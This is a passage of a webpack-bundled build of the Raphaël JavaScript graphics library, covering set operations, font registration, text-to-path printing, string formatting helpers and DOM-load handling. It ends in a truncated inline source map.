item = this.items[--i].animate(anim);\n        while (i--) {\n            this.items[i] && !this.items[i].removed && this.items[i].animateWith(item, anim, anim);\n            (this.items[i] && !this.items[i].removed) || len--;\n        }\n        return this;\n    };\n    setproto.insertAfter = function (el) {\n        var i = this.items.length;\n        while (i--) {\n            this.items[i].insertAfter(el);\n        }\n        return this;\n    };\n    setproto.getBBox = function () {\n        var x = [],\n            y = [],\n            x2 = [],\n            y2 = [];\n        for (var i = this.items.length; i--;) if (!this.items[i].removed) {\n            var box = this.items[i].getBBox();\n            x.push(box.x);\n            y.push(box.y);\n            x2.push(box.x + box.width);\n            y2.push(box.y + box.height);\n        }\n        x = mmin[apply](0, x);\n        y = mmin[apply](0, y);\n        x2 = mmax[apply](0, x2);\n        y2 = mmax[apply](0, y2);\n        return {\n            x: x,\n            y: y,\n            x2: x2,\n            y2: y2,\n            width: x2 - x,\n            height: y2 - y\n        };\n    };\n    setproto.clone = function (s) {\n        s = this.paper.set();\n        for (var i = 0, ii = this.items.length; i < ii; i++) {\n            s.push(this.items[i].clone());\n        }\n        return s;\n    };\n    setproto.toString = function () {\n        return "Rapha\\xebl\\u2018s set";\n    };\n\n    setproto.glow = function(glowConfig) {\n        var ret = this.paper.set();\n        this.forEach(function(shape, index){\n            var g = shape.glow(glowConfig);\n            if(g != null){\n                g.forEach(function(shape2, index2){\n                    ret.push(shape2);\n                });\n            }\n        });\n        return ret;\n    };\n\n\n    /*\\\n     * Set.isPointInside\n     [ method ]\n     **\n     * Determine if given point is inside this setâs elements\n     **\n     > Parameters\n     **\n     - x (number) x coordinate of the point\n     - y (number) y coordinate of the point\n     = (boolean) `true` if point is inside any of the set\'s elements\n     \\*/\n    setproto.isPointInside = function (x, y) {\n        var isPointInside = false;\n        this.forEach(function (el) {\n            if (el.isPointInside(x, y)) {\n                isPointInside = true;\n                return false; // stop loop\n            }\n        });\n        return isPointInside;\n    };\n\n    /*\\\n     * Raphael.registerFont\n     [ method ]\n     **\n     * Adds given font to the registered set of fonts for RaphaÃ«l. Should be used as an internal call from within CufÃ³nâs font file.\n     * Returns original parameter, so it could be used with chaining.\n     # <a href="https://wiki.github.com/sorccu/cufon/about">More about CufÃ³n and how to convert your font form TTF, OTF, etc to JavaScript file.</a>\n     **\n     > Parameters\n     **\n     - font (object) the font to register\n     = (object) the font you passed in\n     > Usage\n     | Cufon.registerFont(Raphael.registerFont({â¦}));\n    \\*/\n    R.registerFont = function (font) {\n        if (!font.face) {\n            return font;\n        }\n        this.fonts = this.fonts || {};\n        var fontcopy = {\n                w: font.w,\n                face: {},\n                glyphs: {}\n            },\n            family = font.face["font-family"];\n        for (var prop in font.face) if (font.face[has](prop)) {\n            fontcopy.face[prop] = font.face[prop];\n        }\n        if (this.fonts[family]) {\n            this.fonts[family].push(fontcopy);\n        } else {\n            this.fonts[family] = [fontcopy];\n        }\n        if (!font.svg) {\n            fontcopy.face["units-per-em"] = toInt(font.face["units-per-em"], 10);\n            for (var glyph in font.glyphs) if (font.glyphs[has](glyph)) {\n                var path = font.glyphs[glyph];\n                fontcopy.glyphs[glyph] = {\n                    w: path.w,\n                    k: {},\n                    d: path.d && "M" + path.d.replace(/[mlcxtrv]/g, function (command) {\n                            return {l: "L", c: "C", x: "z", t: "m", r: "l", v: "c"}[command] || "M";\n                        }) + "z"\n                };\n                if (path.k) {\n                    for (var k in path.k) if (path[has](k)) {\n                        fontcopy.glyphs[glyph].k[k] = path.k[k];\n                    }\n                }\n            }\n        }\n        return font;\n    };\n    /*\\\n     * Paper.getFont\n     [ method ]\n     **\n     * Finds font object in the registered fonts by given parameters. You could specify only one word from the font name, like âMyriadâ for âMyriad Proâ.\n     **\n     > Parameters\n     **\n     - family (string) font family name or any word from it\n     - weight (string) #optional font weight\n     - style (string) #optional font style\n     - stretch (string) #optional font stretch\n     = (object) the font object\n     > Usage\n     | paper.print(100, 100, "Test string", paper.getFont("Times", 800), 30);\n    \\*/\n    paperproto.getFont = function (family, weight, style, stretch) {\n        stretch = stretch || "normal";\n        style = style || "normal";\n        weight = +weight || {normal: 400, bold: 700, lighter: 300, bolder: 800}[weight] || 400;\n        if (!R.fonts) {\n            return;\n        }\n        var font = R.fonts[family];\n        if (!font) {\n            var name = new RegExp("(^|\\\\s)" + family.replace(/[^\\w\\d\\s+!~.:_-]/g, E) + "(\\\\s|$)", "i");\n            for (var fontName in R.fonts) if (R.fonts[has](fontName)) {\n                if (name.test(fontName)) {\n                    font = R.fonts[fontName];\n                    break;\n                }\n            }\n        }\n        var thefont;\n        if (font) {\n            for (var i = 0, ii = font.length; i < ii; i++) {\n                thefont = font[i];\n                if (thefont.face["font-weight"] == weight && (thefont.face["font-style"] == style || !thefont.face["font-style"]) && thefont.face["font-stretch"] == stretch) {\n                    break;\n                }\n            }\n        }\n        return thefont;\n    };\n    /*\\\n     * Paper.print\n     [ method ]\n     **\n     * Creates path that represent given text written using given font at given position with given size.\n     * Result of the method is path element that contains whole text as a separate path.\n     **\n     > Parameters\n     **\n     - x (number) x position of the text\n     - y (number) y position of the text\n     - string (string) text to print\n     - font (object) font object, see @Paper.getFont\n     - size (number) #optional size of the font, default is `16`\n     - origin (string) #optional could be `"baseline"` or `"middle"`, default is `"middle"`\n     - letter_spacing (number) #optional number in range `-1..1`, default is `0`\n     - line_spacing (number) #optional number in range `1..3`, default is `1`\n     = (object) resulting path element, which consist of all letters\n     > Usage\n     | var txt = r.print(10, 50, "print", r.getFont("Museo"), 30).attr({fill: "#fff"});\n    \\*/\n    paperproto.print = function (x, y, string, font, size, origin, letter_spacing, line_spacing) {\n        origin = origin || "middle"; // baseline|middle\n        letter_spacing = mmax(mmin(letter_spacing || 0, 1), -1);\n        line_spacing = mmax(mmin(line_spacing || 1, 3), 1);\n        var letters = Str(string)[split](E),\n            shift = 0,\n            notfirst = 0,\n            path = E,\n            scale;\n        R.is(font, "string") && (font = this.getFont(font));\n        if (font) {\n            scale = (size || 16) / font.face["units-per-em"];\n            var bb = font.face.bbox[split](separator),\n                top = +bb[0],\n                lineHeight = bb[3] - bb[1],\n                shifty = 0,\n                height = +bb[1] + (origin == "baseline" ? lineHeight + (+font.face.descent) : lineHeight / 2);\n            for (var i = 0, ii = letters.length; i < ii; i++) {\n                if (letters[i] == "\\n") {\n                    shift = 0;\n                    curr = 0;\n                    notfirst = 0;\n                    shifty += lineHeight * line_spacing;\n                } else {\n                    var prev = notfirst && font.glyphs[letters[i - 1]] || {},\n                        curr = font.glyphs[letters[i]];\n                    shift += notfirst ? (prev.w || font.w) + (prev.k && prev.k[letters[i]] || 0) + (font.w * letter_spacing) : 0;\n                    notfirst = 1;\n                }\n                if (curr && curr.d) {\n                    path += R.transformPath(curr.d, ["t", shift * scale, shifty * scale, "s", scale, scale, top, height, "t", (x - top) / scale, (y - height) / scale]);\n                }\n            }\n        }\n        return this.path(path).attr({\n            fill: "#000",\n            stroke: "none"\n        });\n    };\n\n    /*\\\n     * Paper.add\n     [ method ]\n     **\n     * Imports elements in JSON array in format `{type: type, <attributes>}`\n     **\n     > Parameters\n     **\n     - json (array)\n     = (object) resulting set of imported elements\n     > Usage\n     | paper.add([\n     |     {\n     |         type: "circle",\n     |         cx: 10,\n     |         cy: 10,\n     |         r: 5\n     |     },\n     |     {\n     |         type: "rect",\n     |         x: 10,\n     |         y: 10,\n     |         width: 10,\n     |         height: 10,\n     |         fill: "#fc0"\n     |     }\n     | ]);\n    \\*/\n    paperproto.add = function (json) {\n        if (R.is(json, "array")) {\n            var res = this.set(),\n                i = 0,\n                ii = json.length,\n                j;\n            for (; i < ii; i++) {\n                j = json[i] || {};\n                elements[has](j.type) && res.push(this[j.type]().attr(j));\n            }\n        }\n        return res;\n    };\n\n    /*\\\n     * Raphael.format\n     [ method ]\n     **\n     * Simple format function. Replaces construction of type â`{<number>}`â to the corresponding argument.\n     **\n     > Parameters\n     **\n     - token (string) string to format\n     - â¦ (string) rest of arguments will be treated as parameters for replacement\n     = (string) formated string\n     > Usage\n     | var x = 10,\n     |     y = 20,\n     |     width = 40,\n     |     height = 50;\n     | // this will draw a rectangular shape equivalent to "M10,20h40v50h-40z"\n     | paper.path(Raphael.format("M{0},{1}h{2}v{3}h{4}z", x, y, width, height, -width));\n    \\*/\n    R.format = function (token, params) {\n        var args = R.is(params, array) ? [0][concat](params) : arguments;\n        token && R.is(token, string) && args.length - 1 && (token = token.replace(formatrg, function (str, i) {\n            return args[++i] == null ? E : args[i];\n        }));\n        return token || E;\n    };\n    /*\\\n     * Raphael.fullfill\n     [ method ]\n     **\n     * A little bit more advanced format function than @Raphael.format. Replaces construction of type â`{<name>}`â to the corresponding argument.\n     **\n     > Parameters\n     **\n     - token (string) string to format\n     - json (object) object which properties will be used as a replacement\n     = (string) formated string\n     > Usage\n     | // this will draw a rectangular shape equivalent to "M10,20h40v50h-40z"\n     | paper.path(Raphael.fullfill("M{x},{y}h{dim.width}v{dim.height}h{dim[\'negative width\']}z", {\n     |     x: 10,\n     |     y: 20,\n     |     dim: {\n     |         width: 40,\n     |         height: 50,\n     |         "negative width": -40\n     |     }\n     | }));\n    \\*/\n    R.fullfill = (function () {\n        var tokenRegex = /\\{([^\\}]+)\\}/g,\n            objNotationRegex = /(?:(?:^|\\.)(.+?)(?=\\[|\\.|$|\\()|\\[(\'|")(.+?)\\2\\])(\\(\\))?/g, // matches .xxxxx or ["xxxxx"] to run over object properties\n            replacer = function (all, key, obj) {\n                var res = obj;\n                key.replace(objNotationRegex, function (all, name, quote, quotedName, isFunc) {\n                    name = name || quotedName;\n                    if (res) {\n                        if (name in res) {\n                            res = res[name];\n                        }\n                        typeof res == "function" && isFunc && (res = res());\n                    }\n                });\n                res = (res == null || res == obj ? all : res) + "";\n                return res;\n            };\n        return function (str, obj) {\n            return String(str).replace(tokenRegex, function (all, key) {\n                return replacer(all, key, obj);\n            });\n        };\n    })();\n    /*\\\n     * Raphael.ninja\n     [ method ]\n     **\n     * If you want to leave no trace of RaphaÃ«l (Well, RaphaÃ«l creates only one global variable `Raphael`, but anyway.) You can use `ninja` method.\n     * Beware, that in this case plugins could stop working, because they are depending on global variable existence.\n     **\n     = (object) Raphael object\n     > Usage\n     | (function (local_raphael) {\n     |     var paper = local_raphael(10, 10, 320, 200);\n     |     â¦\n     | })(Raphael.ninja());\n    \\*/\n    R.ninja = function () {\n        if (oldRaphael.was) {\n            g.win.Raphael = oldRaphael.is;\n        } else {\n            // IE8 raises an error when deleting window property\n            window.Raphael = undefined;\n            try {\n                delete window.Raphael;\n            } catch(e) {}\n        }\n        return R;\n    };\n    /*\\\n     * Raphael.st\n     [ property (object) ]\n     **\n     * You can add your own method to elements and sets. It is wise to add a set method for each element method\n     * you added, so you will be able to call the same method on sets too.\n     **\n     * See also @Raphael.el.\n     > Usage\n     | Raphael.el.red = function () {\n     |     this.attr({fill: "#f00"});\n     | };\n     | Raphael.st.red = function () {\n     |     this.forEach(function (el) {\n     |         el.red();\n     |     });\n     | };\n     | // then use it\n     | paper.set(paper.circle(100, 100, 20), paper.circle(110, 100, 20)).red();\n    \\*/\n    R.st = setproto;\n\n    eve.on("raphael.DOMload", function () {\n        loaded = true;\n    });\n\n    // Firefox <3.6 fix: https://webreflection.blogspot.com/2009/11/195-chars-to-help-lazy-loading.html\n    (function (doc, loaded, f) {\n        if (doc.readyState == null && doc.addEventListener){\n            doc.addEventListener(loaded, f = function () {\n                doc.removeEventListener(loaded, f, false);\n                doc.readyState = "complete";\n            }, false);\n            doc.readyState = "loading";\n        }\n        function isLoaded() {\n            (/in/).test(doc.readyState) ? setTimeout(isLoaded, 9) : R.eve("raphael.DOMload");\n        }\n        isLoaded();\n    })(document, "DOMContentLoaded");\n\n    return R;\n}).apply(exports, __WEBPACK_AMD_DEFINE_ARRAY__),\n\t\t\t\t__WEBPACK_AMD_DEFINE_RESULT__ !== undefined && (module.exports = __WEBPACK_AMD_DEFINE_RESULT__));\n//# sourceURL=[module]\n//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJmaWxlIjoiLi9kZXYvcmFwaGFlbC5jb3JlLmpzLmpzIiwic291cmNlcyI6WyJ3ZWJwYWNrOi8vUmFwaGFlbC8uL2Rldi9yYXBoYWVsLmNvcmUuanM/OTRkOSJdLCJzb3VyY2VzQ29udGVudCI6WyJkZWZpbmUoW1wiZXZlXCJdLCBmdW5jdGlvbihldmUpIHtcblxuICAgIC8qXFxcbiAgICAgKiBSYXBoYWVsXG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBDcmVhdGVzIGEgY2FudmFzIG9iamVjdCBvbiB3aGljaCB0byBkcmF3LlxuICAgICAqIFlvdSBtdXN0IGRvIHRoaXMgZmlyc3QsIGFzIGFsbCBmdXR1cmUgY2FsbHMgdG8gZHJhd2luZyBtZXRob2RzXG4gICAgICogZnJvbSB0aGlzIGluc3RhbmNlIHdpbGwgYmUgYm91bmQgdG8gdGhpcyBjYW52YXMuXG4gICAgID4gUGFyYW1ldGVyc1xuICAgICAqKlxuICAgICAtIGNvbnRhaW5lciAoSFRNTEVsZW1lbnR8c3RyaW5nKSBET00gZWxlbWVudCBvciBpdHMgSUQgd2hpY2ggaXMgZ29pbmcgdG8gYmUgYSBwYXJlbnQgZm9yIGRyYXdpbmcgc3VyZmFjZVxuICAgICAtIHdpZHRoIChudW1iZXIpXG4gICAgIC0gaGVpZ2h0IChudW1iZXIpXG4gICAgIC0gY2FsbGJhY2sgKGZ1bmN0aW9uKSAjb3B0aW9uYWwgY2FsbGJhY2sgZnVuY3Rpb24gd2hpY2ggaXMgZ29pbmcgdG8gYmUgZXhlY3V0ZWQgaW4gdGhlIGNvbnRleHQgb2YgbmV3bHkgY3JlYXRlZCBwYXBlclxuICAgICAqIG9yXG4gICAgIC0geCAobnVtYmVyKVxuICAgICAtIHkgKG51bWJlcilcbiAgICAgLSB3aWR0aCAobnVtYmVyKVxuICAgICAtIGhlaWdodCAobnVtYmVyKVxuICAgICAtIGNhbGxiYWNrIChmdW5jdGlvbikgI29wdGlvbmFsIGNhbGxiYWNrIGZ1bmN0aW9uIHdoaWNoIGlzIGdvaW5nIHRvIGJlIGV4ZWN1dGVkIGluIHRoZSBjb250ZXh0IG9mIG5ld2x5IGNyZWF0ZWQgcGFwZXJcbiAgICAgKiBvclxuICAgICAtIGFsbCAoYXJyYXkpIChmaXJzdCAzIG9yIDQgZWxlbWVudHMgaW4gdGhlIGFycmF5IGFyZSBlcXVhbCB0byBbY29udGFpbmVySUQsIHdpZHRoLCBoZWlnaHRdIG9yIFt4LCB5LCB3aWR0aCwgaGVpZ2h0XS4gVGhlIHJlc3QgYXJlIGVsZW1lbnQgZGVzY3JpcHRpb25zIGluIGZvcm1hdCB7dHlwZTogdHlwZSwgPGF0dHJpYnV0ZXM+fSkuIFNlZSBAUGFwZXIuYWRkLlxuICAgICAtIGNhbGxiYWNrIChmdW5jdGlvbikgI29wdGlvbmFsIGNhbGxiYWNrIGZ1bmN0aW9uIHdoaWNoIGlzIGdvaW5nIHRvIGJlIGV4ZWN1dGVkIGluIHRoZSBjb250ZXh0IG9mIG5ld2x5IGNyZWF0ZWQgcGFwZXJcbiAgICAgKiBvclxuICAgICAtIG9uUmVhZHlDYWxsYmFjayAoZnVuY3Rpb24pIGZ1bmN0aW9uIHRoYXQgaXMgZ29pbmcgdG8gYmUgY2FsbGVkIG9uIERPTSByZWFkeSBldmVudC4gWW91IGNhbiBhbHNvIHN1YnNjcmliZSB0byB0aGlzIGV2ZW50IHZpYSBFdmXigJlzIOKAnERPTUxvYWTigJ0gZXZlbnQuIEluIHRoaXMgY2FzZSBtZXRob2QgcmV0dXJucyBgdW5kZWZpbmVkYC5cbiAgICAgPSAob2JqZWN0KSBAUGFwZXJcbiAgICAgPiBVc2FnZVxuICAgICB8IC8vIEVhY2ggb2YgdGhlIGZvbGxvd2luZyBleGFtcGxlcyBjcmVhdGUgYSBjYW52YXNcbiAgICAgfCAvLyB0aGF0IGlzIDMyMHB4IHdpZGUgYnkgMjAwcHggaGlnaC5cbiAgICAgfCAvLyBDYW52YXMgaXMgY3JlYXRlZCBhdCB0aGUgdmlld3BvcnTigJlzIDEwLDUwIGNvb3JkaW5hdGUuXG4gICAgIHwgdmFyIHBhcGVyID0gUmFwaGFlbCgxMCwgNTAsIDMyMCwgMjAwKTtcbiAgICAgfCAvLyBDYW52YXMgaXMgY3JlYXRlZCBhdCB0aGUgdG9wIGxlZnQgY29ybmVyIG9mIHRoZSAjbm90ZXBhZCBlbGVtZW50XG4gICAgIHwgLy8gKG9yIGl0cyB0b3AgcmlnaHQgY29ybmVyIGluIGRpcj1cInJ0bFwiIGVsZW1lbnRzKVxuICAgICB8IHZhciBwYXBlciA9IFJhcGhhZWwoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoXCJub3RlcGFkXCIpLCAzMjAsIDIwMCk7XG4gICAgIHwgLy8gU2FtZSBhcyBhYm92ZVxuICAgICB8IHZhciBwYXBlciA9IFJhcGhhZWwoXCJub3RlcGFkXCIsIDMyMCwgMjAwKTtcbiAgICAgfCAvLyBJbWFnZSBkdW1wXG4gICAgIHwgdmFyIHNldCA9IFJhcGhhZWwoW1wibm90ZXBhZFwiLCAzMjAsIDIwMCwge1xuICAgICB8ICAgICB0eXBlOiBcInJlY3RcIixcbiAgICAgfCAgICAgeDogMTAsXG4gICAgIHwgICAgIHk6IDEwLFxuICAgICB8ICAgICB3aWR0aDogMjUsXG4gICAgIHwgICAgIGhlaWdodDogMjUsXG4gICAgIHwgICAgIHN0cm9rZTogXCIjZjAwXCJcbiAgICAgfCB9LCB7XG4gICAgIHwgICAgIHR5cGU6IFwidGV4dFwiLFxuICAgICB8ICAgICB4OiAzMCxcbiAgICAgfCAgICAgeTogNDAsXG4gICAgIHwgICAgIHRleHQ6IFwiRHVtcFwiXG4gICAgIHwgfV0pO1xuICAgIFxcKi9cbiAgICBmdW5jdGlvbiBSKGZpcnN0KSB7XG4gICAgICAgIGlmIChSLmlzKGZpcnN0LCBcImZ1bmN0aW9uXCIpKSB7XG4gICAgICAgICAgICByZXR1cm4gbG9hZGVkID8gZmlyc3QoKSA6IGV2ZS5vbihcInJhcGhhZWwuRE9NbG9hZFwiLCBmaXJzdCk7XG4gICAgICAgIH0gZWxzZSBpZiAoUi5pcyhmaXJzdCwgYXJyYXkpKSB7XG4gICAgICAgICAgICByZXR1cm4gUi5fZW5naW5lLmNyZWF0ZVthcHBseV0oUiwgZmlyc3Quc3BsaWNlKDAsIDMgKyBSLmlzKGZpcnN0WzBdLCBudSkpKS5hZGQoZmlyc3QpO1xuICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgdmFyIGFyZ3MgPSBBcnJheS5wcm90b3R5cGUuc2xpY2UuY2FsbChhcmd1bWVudHMsIDApO1xuICAgICAgICAgICAgaWYgKFIuaXMoYXJnc1thcmdzLmxlbmd0aCAtIDFdLCBcImZ1bmN0aW9uXCIpKSB7XG4gICAgICAgICAgICAgICAgdmFyIGYgPSBhcmdzLnBvcCgpO1xuICAgICAgICAgICAgICAgIHJldHVybiBsb2FkZWQgPyBmLmNhbGwoUi5fZW5naW5lLmNyZWF0ZVthcHBseV0oUiwgYXJncykpIDogZXZlLm9uKFwicmFwaGFlbC5ET01sb2FkXCIsIGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgICAgICAgICAgZi5jYWxsKFIuX2VuZ2luZS5jcmVhdGVbYXBwbHldKFIsIGFyZ3MpKTtcbiAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgcmV0dXJuIFIuX2VuZ2luZS5jcmVhdGVbYXBwbHldKFIsIGFyZ3VtZW50cyk7XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICB9XG4gICAgUi52ZXJzaW9uID0gXCIyLjIuMFwiO1xuICAgIFIuZXZlID0gZXZlO1xuICAgIHZhciBsb2FkZWQsXG4gICAgICAgIHNlcGFyYXRvciA9IC9bLCBdKy8sXG4gICAgICAgIGVsZW1lbnRzID0ge2NpcmNsZTogMSwgcmVjdDogMSwgcGF0aDogMSwgZWxsaXBzZTogMSwgdGV4dDogMSwgaW1hZ2U6IDF9LFxuICAgICAgICBmb3JtYXRyZyA9IC9cXHsoXFxkKylcXH0vZyxcbiAgICAgICAgcHJvdG8gPSBcInByb3RvdHlwZVwiLFxuICAgICAgICBoYXMgPSBcImhhc093blByb3BlcnR5XCIsXG4gICAgICAgIGcgPSB7XG4gICAgICAgICAgICBkb2M6IGRvY3VtZW50LFxuICAgICAgICAgICAgd2luOiB3aW5kb3dcbiAgICAgICAgfSxcbiAgICAgICAgb2xkUmFwaGFlbCA9IHtcbiAgICAgICAgICAgIHdhczogT2JqZWN0LnByb3RvdHlwZVtoYXNdLmNhbGwoZy53aW4sIFwiUmFwaGFlbFwiKSxcbiAgICAgICAgICAgIGlzOiBnLndpbi5SYXBoYWVsXG4gICAgICAgIH0sXG4gICAgICAgIFBhcGVyID0gZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgLypcXFxuICAgICAgICAgICAgICogUGFwZXIuY2FcbiAgICAgICAgICAgICBbIHByb3BlcnR5IChvYmplY3QpIF1cbiAgICAgICAgICAgICAqKlxuICAgICAgICAgICAgICogU2hvcnRjdXQgZm9yIEBQYXBlci5jdXN0b21BdHRyaWJ1dGVzXG4gICAgICAgICAgICBcXCovXG4gICAgICAgICAgICAvKlxcXG4gICAgICAgICAgICAgKiBQYXBlci5jdXN0b21BdHRyaWJ1dGVzXG4gICAgICAgICAgICAgWyBwcm9wZXJ0eSAob2JqZWN0KSBdXG4gICAgICAgICAgICAgKipcbiAgICAgICAgICAgICAqIElmIHlvdSBoYXZlIGEgc2V0IG9mIGF0dHJpYnV0ZXMgdGhhdCB5b3Ugd291bGQgbGlrZSB0byByZXByZXNlbnRcbiAgICAgICAgICAgICAqIGFzIGEgZnVuY3Rpb24gb2Ygc29tZSBudW1iZXIgeW91IGNhbiBkbyBpdCBlYXNpbHkgd2l0aCBjdXN0b20gYXR0cmlidXRlczpcbiAgICAgICAgICAgICA+IFVzYWdlXG4gICAgICAgICAgICAgfCBwYXBlci5jdXN0b21BdHRyaWJ1dGVzLmh1ZSA9IGZ1bmN0aW9uIChudW0pIHtcbiAgICAgICAgICAgICB8ICAgICBudW0gPSBudW0gJSAxO1xuICAgICAgICAgICAgIHwgICAgIHJldHVybiB7ZmlsbDogXCJoc2IoXCIgKyBudW0gKyBcIiwgMC43NSwgMSlcIn07XG4gICAgICAgICAgICAgfCB9O1xuICAgICAgICAgICAgIHwgLy8gQ3VzdG9tIGF0dHJpYnV0ZSDigJxodWXigJ0gd2lsbCBjaGFuZ2UgZmlsbFxuICAgICAgICAgICAgIHwgLy8gdG8gYmUgZ2l2ZW4gaHVlIHdpdGggZml4ZWQgc2F0dXJhdGlvbiBhbmQgYnJpZ2h0bmVzcy5cbiAgICAgICAgICAgICB8IC8vIE5vdyB5b3UgY2FuIHVzZSBpdCBsaWtlIHRoaXM6XG4gICAgICAgICAgICAgfCB2YXIgYyA9IHBhcGVyLmNpcmNsZSgxMCwgMTAsIDEwKS5hdHRyKHtodWU6IC40NX0pO1xuICAgICAgICAgICAgIHwgLy8gb3IgZXZlbiBsaWtlIHRoaXM6XG4gICAgICAgICAgICAgfCBjLmFuaW1hdGUoe2h1ZTogMX0sIDFlMyk7XG4gICAgICAgICAgICAgfFxuICAgICAgICAgICAgIHwgLy8gWW91IGNvdWxkIGFsc28gY3JlYXRlIGN1c3RvbSBhdHRyaWJ1dGVcbiAgICAgICAgICAgICB8IC8vIHdpdGggbXVsdGlwbGUgcGFyYW1ldGVyczpcbiAgICAgICAgICAgICB8IHBhcGVyLmN1c3RvbUF0dHJpYnV0ZXMuaHNiID0gZnVuY3Rpb24gKGgsIHMsIGIpIHtcbiAgICAgICAgICAgICB8ICAgICByZXR1cm4ge2ZpbGw6IFwiaHNiKFwiICsgW2gsIHMsIGJdLmpvaW4oXCIsXCIpICsgXCIpXCJ9O1xuICAgICAgICAgICAgIHwgfTtcbiAgICAgICAgICAgICB8IGMuYXR0cih7aHNiOiBcIjAuNSAuOCAxXCJ9KTtcbiAgICAgICAgICAgICB8IGMuYW5pbWF0ZSh7aHNiOiBbMSwgMCwgMC41XX0sIDFlMyk7XG4gICAgICAgICAgICBcXCovXG4gICAgICAgICAgICB0aGlzLmNhID0gdGhpcy5jdXN0b21BdHRyaWJ1dGVzID0ge307XG4gICAgICAgIH0sXG4gICAgICAgIHBhcGVycHJvdG8sXG4gICAgICAgIGFwcGVuZENoaWxkID0gXCJhcHBlbmRDaGlsZFwiLFxuICAgICAgICBhcHBseSA9IFwiYXBwbHlcIixcbiAgICAgICAgY29uY2F0ID0gXCJjb25jYXRcIixcbiAgICAgICAgLy90YWtlbiBmcm9tIE1vZGVybml6ciB0b3VjaCB0ZXN0OiBodHRwczovL2dpdGh1Yi5jb20vTW9kZXJuaXpyL01vZGVybml6ci9ibG9iL21hc3Rlci9mZWF0dXJlLWRldGVjdHMvdG91Y2hldmVudHMuanMjTDQwXG4gICAgICAgIHN1cHBvcnRzVG91Y2ggPSAoJ29udG91Y2hzdGFydCcgaW4gd2luZG93KSB8fCB3aW5kb3cuVG91Y2hFdmVudCB8fCB3aW5kb3cuRG9jdW1lbnRUb3VjaCAmJiBkb2N1bWVudCBpbnN0YW5jZW9mIERvY3VtZW50VG91Y2gsXG4gICAgICAgIEUgPSBcIlwiLFxuICAgICAgICBTID0gXCIgXCIsXG4gICAgICAgIFN0ciA9IFN0cmluZyxcbiAgICAgICAgc3BsaXQgPSBcInNwbGl0XCIsXG4gICAgICAgIGV2ZW50cyA9IFwiY2xpY2sgZGJsY2xpY2sgbW91c2Vkb3duIG1vdXNlbW92ZSBtb3VzZW91dCBtb3VzZW92ZXIgbW91c2V1cCB0b3VjaHN0YXJ0IHRvdWNobW92ZSB0b3VjaGVuZCB0b3VjaGNhbmNlbFwiW3NwbGl0XShTKSxcbiAgICAgICAgdG91Y2hNYXAgPSB7XG4gICAgICAgICAgICBtb3VzZWRvd246IFwidG91Y2hzdGFydFwiLFxuICAgICAgICAgICAgbW91c2Vtb3ZlOiBcInRvdWNobW92ZVwiLFxuICAgICAgICAgICAgbW91c2V1cDogXCJ0b3VjaGVuZFwiXG4gICAgICAgIH0sXG4gICAgICAgIGxvd2VyQ2FzZSA9IFN0ci5wcm90b3R5cGUudG9Mb3dlckNhc2UsXG4gICAgICAgIG1hdGggPSBNYXRoLFxuICAgICAgICBtbWF4ID0gbWF0aC5tYXgsXG4gICAgICAgIG1taW4gPSBtYXRoLm1pbixcbiAgICAgICAgYWJzID0gbWF0aC5hYnMsXG4gICAgICAgIHBvdyA9IG1hdGgucG93LFxuICAgICAgICBQSSA9IG1hdGguUEksXG4gICAgICAgIG51ID0gXCJudW1iZXJcIixcbiAgICAgICAgc3RyaW5nID0gXCJzdHJpbmdcIixcbiAgICAgICAgYXJyYXkgPSBcImFycmF5XCIsXG4gICAgICAgIHRvU3RyaW5nID0gXCJ0b1N0cmluZ1wiLFxuICAgICAgICBmaWxsU3RyaW5nID0gXCJmaWxsXCIsXG4gICAgICAgIG9iamVjdFRvU3RyaW5nID0gT2JqZWN0LnByb3RvdHlwZS50b1N0cmluZyxcbiAgICAgICAgcGFwZXIgPSB7fSxcbiAgICAgICAgcHVzaCA9IFwicHVzaFwiLFxuICAgICAgICBJU1VSTCA9IFIuX0lTVVJMID0gL151cmxcXChbJ1wiXT8oLis/KVsnXCJdP1xcKSQvaSxcbiAgICAgICAgY29sb3VyUmVnRXhwID0gL15cXHMqKCgjW2EtZlxcZF17Nn0pfCgjW2EtZlxcZF17M30pfHJnYmE/XFwoXFxzKihbXFxkXFwuXSslP1xccyosXFxzKltcXGRcXC5dKyU/XFxzKixcXHMqW1xcZFxcLl0rJT8oPzpcXHMqLFxccypbXFxkXFwuXSslPyk/KVxccypcXCl8aHNiYT9cXChcXHMqKFtcXGRcXC5dKyg/OmRlZ3xcXHhiMHwlKT9cXHMqLFxccypbXFxkXFwuXSslP1xccyosXFxzKltcXGRcXC5dKyg/OiU/XFxzKixcXHMqW1xcZFxcLl0rKT8pJT9cXHMqXFwpfGhzbGE/XFwoXFxzKihbXFxkXFwuXSsoPzpkZWd8XFx4YjB8JSk/XFxzKixcXHMqW1xcZFxcLl0rJT9cXHMqLFxccypbXFxkXFwuXSsoPzolP1xccyosXFxzKltcXGRcXC5dKyk/KSU/XFxzKlxcKSlcXHMqJC9pLFxuICAgICAgICBpc25hbiA9IHtcIk5hTlwiOiAxLCBcIkluZmluaXR5XCI6IDEsIFwiLUluZmluaXR5XCI6IDF9LFxuICAgICAgICBiZXppZXJyZyA9IC9eKD86Y3ViaWMtKT9iZXppZXJcXCgoW14sXSspLChbXixdKyksKFteLF0rKSwoW15cXCldKylcXCkvLFxuICAgICAgICByb3VuZCA9IG1hdGgucm91bmQsXG4gICAgICAgIHNldEF0dHJpYnV0ZSA9IFwic2V0QXR0cmlidXRlXCIsXG4gICAgICAgIHRvRmxvYXQgPSBwYXJzZUZsb2F0LFxuICAgICAgICB0b0ludCA9IHBhcnNlSW50LFxuICAgICAgICB1cHBlckNhc2UgPSBTdHIucHJvdG90eXBlLnRvVXBwZXJDYXNlLFxuICAgICAgICBhdmFpbGFibGVBdHRycyA9IFIuX2F2YWlsYWJsZUF0dHJzID0ge1xuICAgICAgICAgICAgXCJhcnJvdy1lbmRcIjogXCJub25lXCIsXG4gICAgICAgICAgICBcImFycm93LXN0YXJ0XCI6IFwibm9uZVwiLFxuICAgICAgICAgICAgYmx1cjogMCxcbiAgICAgI